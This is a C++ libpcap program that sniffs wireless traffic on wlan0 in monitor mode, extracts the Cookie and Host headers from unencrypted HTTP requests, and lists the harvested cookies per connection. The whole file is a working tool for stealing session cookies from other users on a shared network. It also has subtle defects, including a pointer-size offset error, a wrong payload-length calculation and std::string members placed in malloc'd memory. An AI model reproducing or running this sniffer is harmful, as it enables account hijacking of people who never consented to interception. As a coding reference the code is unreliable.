#include <iostream>
#include <pcap.h>
#include <linux/ip.h>           //iphdr
#include <linux/tcp.h>          //tcphdr
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <cstdio>
#include <map>
#include <string>
#include "header.h"

using namespace std;

static pcap_t *handle;
static map<string,struct map_value>m;
//static map<string,string>m;

static int i=0;

string data(string http,string::size_type it)
{
    string result;
    result.clear();
    if (it != string::npos){
        string str2 = http.substr(it);      //cookie or host string extraction
        result=http.substr(it,str2.find("\n"));      //cookie or host ~ \n
        //        cout<<"result: "<<result<<'\n';
        return result;
    }
    return "0";
}
string make_key(struct iphdr * ip_header,struct tcphdr * tcp_header)
{
    char src_buf[16];
    char dest_buf[16];
    inet_ntop(AF_INET,&ip_header->saddr,src_buf,sizeof(src_buf));
    inet_ntop(AF_INET,&ip_header->daddr,dest_buf,sizeof(dest_buf));

    string key(src_buf);
    key.append("|");
    key.append(dest_buf);
    key.append("|");
    key.append(to_string(ntohs(tcp_header->source)));
    key.append("|");
    key.append(to_string(ntohs(tcp_header->dest)));

    //    char *key=static_cast<char*>(malloc(60));
    //    char src_buf[16];
    //    char dest_buf[16];
    //    inet_ntop(AF_INET,&ip_header->saddr,src_buf,sizeof(src_buf));
    //    inet_ntop(AF_INET,&ip_header->daddr,dest_buf,sizeof(dest_buf));

    //    strcat(key,src_buf);
    //    strcat(key,dest_buf);

    //    char srcport[4];
    //    sprintf(srcport,"%d",ntohs(tcp_header->source));
    //    strcat(key,srcport);

    //    char dest[4];
    //    sprintf(dest,"%d",ntohs(tcp_header->dest));
    //    strcat(key,dest);

    //cout<<"key: "<<key<<'\n';
    return key;
}
void save(string key,string cookie,string host)
{
    static struct map_value * value=static_cast<struct map_value *>(malloc(sizeof(struct map_value)));

    system("clear");

    auto iter =m.find(key);
    if(iter == m.end()){
        value->host=host;
        value->cookie=cookie;
        //m.insert(make_pair(key,value));
        m[key]=*value;
//        m[key]=value->host=host;
//        m[key]=value->cookie=cookie;

    }
//    cout<<value->host<<'\n';
//    cout<<value->cookie<<'\n';

    cout<<"지나간 패킷 수 : "<<++i<<'\n';
    cout<<"노트 갯수 : "<<m.size()<<'\n';
    for(auto it=m.begin();it!=m.end();++it){
        cout<<it->first<<'\n';
        cout<<it->second.host<<'\n';
        cout<<it->second.cookie<<'\n';
        //cout<<it->second->cookie<<'\n';
        cout<<"-------------------\n";
    }
    sleep(1);
}

void data_process(const u_char *http,struct iphdr * ip_header, struct tcphdr * tcp_header,int http_len)
{
    string http_data;               //http String ㅂ변환
    for(int i=0;i<http_len;i++)
        http_data+=static_cast<char>(http[i]);

    //cout<<http_data<<'\n';
    //String 으로 cookie 찾기
    string::size_type cookie_it,host_it;
    string key;

    key=make_key(ip_header,tcp_header);

    auto it = m.find(key);
    if(it != m.end())
        it->second.cookie.append(http_data);


    cookie_it=http_data.find("Cookie");        //cookie의 위치
    host_it=http_data.find("Host");            //Host의 위치
    string cookie=data(http_data,cookie_it);
    string host=data(http_data,host_it);
    if(cookie != "0"){ // 문자열 찾았는지 못찾았는지 확인하는 함수.
        save(key,cookie,host);
    }

}
void * plog(void * arg)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("wlan0",BUFSIZ,1,100,errbuf);
    //handle = pcap_open_offline("/root/Desktop/Project/11_18_test_packet.pcap",errbuf);
    while(true)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res ==-1 || res == -2) break;

        struct radiotap_header * radiotap =(struct radiotap_header *)packet;
        uint8_t subtype = *(packet+radiotap->header_length);
        struct llc_header *llc =(struct llc_header *)(packet + radiotap->header_length + 26);   //static_cast<llc_header *>(malloc(sizeof(llc)));
        struct iphdr *ip_header = (struct iphdr *)((uint8_t *)llc + sizeof(llc));
        struct tcphdr * tcp_header = (struct tcphdr *)((uint8_t *)ip_header+(ip_header->ihl*4));

        /*  Check
        if(radiotap->header_length==21) {
            cout<<radiotap->header_length<<'\n';
            printf("Type/SubType :  %02x \n",subtype);
            printf("protocol %d \n",ip_header->protocol);
            printf("Dest : %d\n",ntohs(tcp_header->dest));
            printf("Src : %d\n",ntohs(tcp_header->source));
        }
        */
        if(subtype == 0x88)
            if(ip_header->protocol == TCP &&(ntohs(tcp_header->dest) == 80 || ntohs(tcp_header->source) == 80 )){
                const u_char * http =(u_char *)((uint8_t*)tcp_header+(tcp_header->doff*4));
                int tcp_segment=ntohs(ip_header->tot_len) - ip_header->ihl - (tcp_header->doff*4);

                data_process(http,ip_header,tcp_header,tcp_segment);
            }
    }
}

//int main()
//{
//    cout<<"Cookies Search..."<<'\n';
//    pthread_t plog_thread;
//    pthread_create(&plog_thread,nullptr,plog,nullptr);
//    int a;
//    scanf("%d",&a);
//    if(a==1){
//        return 0;
//    }

//}
